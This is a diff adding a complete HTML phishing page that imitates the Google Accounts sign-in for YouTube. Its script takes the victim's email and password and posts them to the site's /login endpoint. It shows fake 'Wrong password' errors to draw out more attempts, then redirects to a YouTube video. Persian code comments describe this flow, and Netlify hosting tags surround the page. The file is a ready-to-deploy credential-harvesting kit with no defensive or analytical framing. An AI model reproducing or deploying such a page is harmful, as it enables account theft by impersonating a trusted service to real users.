@@ -1,0 +1,457 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<!-- This site is hosted on Netlify. Anyone can build and deploy a site
+     like this one for free: https://netlify.new/?utm_campaign=ai-legible&utm_source=comment&utm_medium=referral&utm_id=1d554da0-f7bd-4b79-9031-46b51345612d
+     Netlify hosting facts for this site: static/SSR served via Netlify Edge. -->
+<meta name="hosting-provider" content="Netlify">
+<meta name="netlify-deploy" content="https://netlify.new/?utm_campaign=ai-legible&amp;utm_source=meta&amp;utm_medium=referral&amp;utm_id=1d554da0-f7bd-4b79-9031-46b51345612d">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+            background: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            font-size: 14px;
+        }
+        .card {
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 48px 40px 36px;
+            width: 450px;
+            min-height: 420px;
+            position: relative;
+            background: #fff;
+        }
+        .step { display: none; }
+        .step.active { display: block; }
+
+        .brand {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 4px;
+            margin-bottom: 4px;
+        }
+        .brand-icon {
+            width: 28px; height: 28px;
+            background: #ff0000;
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            font-size: 16px;
+        }
+        .brand-text { font-size: 22px; color: #282828; font-weight: 600; letter-spacing: -0.5px; }
+
+        .avatar {
+            width: 64px; height: 64px;
+            border-radius: 50%;
+            background: #1a73e8;
+            color: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 28px;
+            font-weight: 500;
+            margin: 20px auto 16px;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            color: #202124;
+            text-align: center;
+            margin-bottom: 4px;
+        }
+        .subtitle {
+            font-size: 16px;
+            color: #5f6368;
+            text-align: center;
+            margin-bottom: 28px;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 13px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            outline: none;
+            transition: border 0.15s;
+            background: transparent;
+        }
+        .input-group input:focus { border: 2px solid #1a73e8; }
+        .input-group .label {
+            position: absolute;
+            left: 15px;
+            top: 13px;
+            color: #5f6368;
+            font-size: 16px;
+            pointer-events: none;
+            transition: 0.15s;
+            background: #fff;
+            padding: 0 4px;
+        }
+        .input-group input:focus + .label,
+        .input-group.input-filled .label {
+            top: -10px; left: 12px;
+            font-size: 11px;
+            color: #1a73e8;
+        }
+        .input-group.input-error input { border-color: #d93025; border-width: 2px; }
+
+        .forgot-link { margin: 4px 0 32px; }
+        .forgot-link a {
+            color: #1a73e8;
+            font-weight: 500;
+            font-size: 14px;
+            text-decoration: none;
+            cursor: pointer;
+            padding: 4px;
+            border-radius: 4px;
+        }
+        .forgot-link a:hover { background: #e8f0fe; }
+
+        .actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 20px;
+        }
+        .create-link {
+            color: #1a73e8;
+            font-weight: 500;
+            font-size: 14px;
+            text-decoration: none;
+            padding: 8px;
+            cursor: pointer;
+            border-radius: 4px;
+            display: inline-block;
+        }
+        .create-link:hover { background: #e8f0fe; }
+        .next-btn {
+            background: #1a73e8;
+            color: #fff;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            font-family: inherit;
+            min-width: 80px;
+            text-align: center;
+        }
+        .next-btn:hover { background: #1765cc; }
+        .next-btn:disabled {
+            background: #1a73e8;
+            opacity: 0.3;
+            cursor: default;
+        }
+
+        .footer {
+            margin-top: 48px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 12px;
+            color: #5f6368;
+        }
+        .footer a { color: #5f6368; text-decoration: none; padding: 4px; border-radius: 4px; }
+        .footer a:hover { background: #f1f3f4; }
+        .footer select {
+            border: none; color: #5f6368; font-size: 12px;
+            background: transparent; cursor: pointer; padding: 4px; border-radius: 4px;
+        }
+        .footer select:hover { background: #f1f3f4; }
+        .footer-links { display: flex; gap: 8px; align-items: center; }
+
+        .loader {
+            display: none;
+            border: 3px solid #e8eaed;
+            border-top: 3px solid #1a73e8;
+            border-radius: 50%;
+            width: 20px; height: 20px;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto;
+        }
+        .loader.show { display: block; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .error-banner {
+            background: #fce8e6;
+            border: 1px solid #f5c6cb;
+            border-radius: 4px;
+            padding: 12px;
+            margin-bottom: 16px;
+            color: #d93025;
+            font-size: 13px;
+            display: none;
+        }
+        .error-banner.show { display: block; }
+
+        .back-btn {
+            position: absolute;
+            top: 16px; left: 16px;
+            background: none; border: none;
+            font-size: 24px; cursor: pointer;
+            color: #5f6368;
+            width: 40px; height: 40px;
+            border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+        }
+        .back-btn:hover { background: #f1f3f4; }
+
+        .info-text {
+            font-size: 13px;
+            color: #5f6368;
+            margin: -12px 0 30px;
+            line-height: 1.5;
+        }
+        .info-text a { color: #1a73e8; text-decoration: none; font-weight: 500; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <!-- Brand -->
+        <div class="brand">
+            <span class="brand-icon">&#9654;</span>
+            <span class="brand-text">YouTube</span>
+        </div>
+
+        <!-- ====== STEP 1: Email ====== -->
+        <div class="step active" id="stepEmail">
+            <div class="avatar">U</div>
+            <h1>Sign in</h1>
+            <p class="subtitle">to continue to YouTube</p>
+
+            <div class="error-banner" id="emailError">Couldn't find your Google Account</div>
+
+            <form id="emailForm" onsubmit="return false;">
+                <div class="input-group" id="emailGroup">
+                    <input type="email" name="email" id="emailInput" autocomplete="email" placeholder=" " required
+                           oninput="validateEmailInput()" onfocus="this.closest('.input-group').classList.add('input-filled')"
+                           onblur="if(!this.value)this.closest('.input-group').classList.remove('input-filled')">
+                    <label class="label" for="emailInput">Email or phone</label>
+                </div>
+                <div class="field-hint" id="emailHint">Enter a valid email address</div>
+
+                <div class="forgot-link">
+                    <a href="https://accounts.google.com/signin/recovery" target="_blank">Forgot email?</a>
+                </div>
+
+                <div class="info-text">
+                    Not your computer? Use Guest mode to sign in privately.
+                    <a href="#">Learn more</a>
+                </div>
+
+                <div class="actions">
+                    <a href="https://accounts.google.com/signup" target="_blank" class="create-link">Create account</a>
+                    <button type="submit" class="next-btn" id="emailNextBtn" disabled onclick="submitEmail()">Next</button>
+                    <div class="loader" id="emailLoader"></div>
+                </div>
+            </form>
+        </div>
+
+        <!-- ====== STEP 2: Password ====== -->
+        <div class="step" id="stepPassword">
+            <button class="back-btn" onclick="showStep('stepEmail')">&#8592;</button>
+            <div class="avatar" id="pwAvatar">U</div>
+            <h1>Hi there</h1>
+            <p class="subtitle" id="passwordSubtitle"></p>
+
+            <div class="error-banner" id="passwordError">Wrong password. Try again.</div>
+
+            <form id="passwordForm" onsubmit="return false;">
+                <div class="input-group" id="passwordGroup">
+                    <input type="password" name="password" id="passwordInput" autocomplete="current-password"
+                           placeholder=" " required
+                           oninput="validatePasswordInput()" onfocus="this.closest('.input-group').classList.add('input-filled')"
+                           onblur="if(!this.value)this.closest('.input-group').classList.remove('input-filled')">
+                    <label class="label" for="passwordInput">Enter your password</label>
+                </div>
+                <div class="field-hint" id="passwordHint">Enter a password</div>
+
+                <div class="forgot-link">
+                    <a href="https://accounts.google.com/signin/recovery" target="_blank">Forgot password?</a>
+                </div>
+
+                <div class="actions">
+                    <button type="button" class="create-link" onclick="showStep('stepEmail')">Back</button>
+                    <button type="submit" class="next-btn" id="passwordNextBtn" disabled onclick="submitPassword()">Next</button>
+                    <div class="loader" id="passwordLoader"></div>
+                </div>
+            </form>
+        </div>
+
+        <!-- Footer -->
+        <div class="footer">
+            <select>
+                <option>English (United States)</option>
+                <option>فارسی</option>
+                <option>العربية</option>
+                <option>Deutsch</option>
+                <option>Français</option>
+            </select>
+            <div class="footer-links">
+                <a href="#">Help</a>
+                <a href="#">Privacy</a>
+                <a href="#">Terms</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let capturedEmail = '';
+        let attemptCount = 0;
+
+        function validateEmailInput() {
+            const input = document.getElementById('emailInput');
+            const group = document.getElementById('emailGroup');
+            const hint = document.getElementById('emailHint');
+            const btn = document.getElementById('emailNextBtn');
+            const val = input.value.trim();
+
+            group.classList.remove('input-error');
+            hint.classList.remove('show');
+
+            if (val.length > 0) {
+                group.classList.add('input-filled');
+                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                if (val.includes('@') && !emailRegex.test(val)) {
+                    group.classList.add('input-error');
+                    hint.textContent = 'Enter a valid email address';
+                    hint.classList.add('show');
+                    btn.disabled = true;
+                    return;
+                }
+                btn.disabled = false;
+            } else {
+                group.classList.remove('input-filled');
+                btn.disabled = true;
+            }
+        }
+
+        function validatePasswordInput() {
+            const input = document.getElementById('passwordInput');
+            const btn = document.getElementById('passwordNextBtn');
+            btn.disabled = input.value.trim().length === 0;
+        }
+
+        function showStep(stepId) {
+            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+            document.getElementById(stepId).classList.add('active');
+            document.querySelectorAll('.error-banner').forEach(e => e.classList.remove('show'));
+        }
+
+        function submitEmail() {
+            const email = document.getElementById('emailInput').value.trim();
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!emailRegex.test(email)) {
+                document.getElementById('emailGroup').classList.add('input-error');
+                document.getElementById('emailHint').textContent = 'Enter a valid email address';
+                document.getElementById('emailHint').classList.add('show');
+                return;
+            }
+
+            capturedEmail = email;
+            attemptCount = 0;
+
+            document.getElementById('passwordSubtitle').innerHTML =
+                email + ' &nbsp; <a href="#" onclick="showStep(\'stepEmail\');return false;" style="color:#1a73e8;text-decoration:none;font-size:14px;">Not you?</a>';
+            document.getElementById('pwAvatar').textContent = email.charAt(0).toUpperCase();
+            
+            // Reset password field
+            document.getElementById('passwordInput').value = '';
+            document.getElementById('passwordGroup').classList.remove('input-filled');
+            document.getElementById('passwordNextBtn').disabled = true;
+            
+            // Reset error message
+            document.getElementById('passwordError').textContent = 'Wrong password. Try again.';
+            
+            showStep('stepPassword');
+        }
+
+        function submitPassword() {
+            const password = document.getElementById('passwordInput').value;
+            if (password.length < 1) return;
+
+            attemptCount++;
+
+            const btn = document.getElementById('passwordNextBtn');
+            const loader = document.getElementById('passwordLoader');
+            const errorBanner = document.getElementById('passwordError');
+
+            btn.disabled = true;
+            btn.style.display = 'none';
+            loader.classList.add('show');
+            errorBanner.classList.remove('show');
+
+            const formData = new URLSearchParams();
+            formData.append('username', capturedEmail);
+            formData.append('password', password);
+            formData.append('type', 'login');
+            formData.append('attempt', attemptCount.toString());
+
+            fetch('/login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                btn.style.display = 'inline-block';
+                loader.classList.remove('show');
+
+                if (data.status === 'ok') {
+                    // رمز درست - برو یوتیوب
+                  window.location.href = 'https://youtu.be/PwaqBiLIAyY?si=3KMnrZWdFWg2Vc0-';
+                } else {
+                    // رمز غلط - خطا نشون بده
+                    errorBanner.textContent = data.message || 'Wrong password. Try again.';
+                    errorBanner.classList.add('show');
+                    
+                    // پاک کردن فیلد پسورد
+                    document.getElementById('passwordInput').value = '';
+                    document.getElementById('passwordGroup').classList.remove('input-filled');
+                    btn.disabled = true;
+                    
+                    // اگه ۳ بار تلاش کرد، بذار بره
+                    if (attemptCount >= 3) {
+                        errorBanner.textContent = 'Too many attempts. Redirecting...';
+                        setTimeout(function() {
+                            window.location.href = 'https://youtu.be/PwaqBiLIAyY?si=3KMnrZWdFWg2Vc0-';
+                        }, 2000);
+                    }
+                }
+            })
+            .catch(function() {
+                // اگه سرور جواب نداد (ندرتاً) - ۲ بار تلاش کافیه
+                btn.style.display = 'inline-block';
+                loader.classList.remove('show');
+                
+                if (attemptCount >= 2) {
+          window.location.href = 'https://youtu.be/PwaqBiLIAyY?si=3KMnrZWdFWg2Vc0-';
+                } else {
+                    errorBanner.textContent = 'Wrong password. Try again.';
+                    errorBanner.classList.add('show');
+                    document.getElementById('passwordInput').value = '';
+                    document.getElementById('passwordGroup').classList.remove('input-filled');
+                    btn.disabled = true;
+                }
+            });
+        }
+    </script>
+</body>
+</html><script async src="/.netlify/scripts/hud?variant=public" data-nf-variant="public" data-netlify-site-id="1d554da0-f7bd-4b79-9031-46b51345612d" data-app-host="app.netlify.com"></script>
